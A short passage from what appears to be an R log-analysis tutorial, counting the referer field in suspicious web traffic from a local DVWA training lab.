…
Not as helpful as I was hoping. Let’s just get a quick count of the
`referer` field.

    suspicious_activity |>
        count(referer, sort=TRUE) 

    ## # A tibble: 233 × 2
    ##    referer                                              n
    ##    <chr>                                            <int>
    ##  1 <NA>                                              3736
    ##  2 http://192.168.56.101/dvwa/vulnerabilities/exec/    32
    ##  3 http://192.168.56.101/dashboard/docs/               28
    ##  4 http://192.168.56.101/dashboard/                    24
    ##  5 http://192.168.56.101/dvwa/index.php                20
    ##  6 http://192.168.56.101/dashboard/docs/images/        19
    ##  7 http://192.168.56.101/dvwa/setup.php                17
    ##  8 http://192.168.56.101/dvwa/vulnerabilities/         17
    ##  9 http://192.168.56.101/dashboard/images/             16
    ## 10 http://192.168.56.101/dvwa/security.php             16
    ## # … with 223 more rows
…
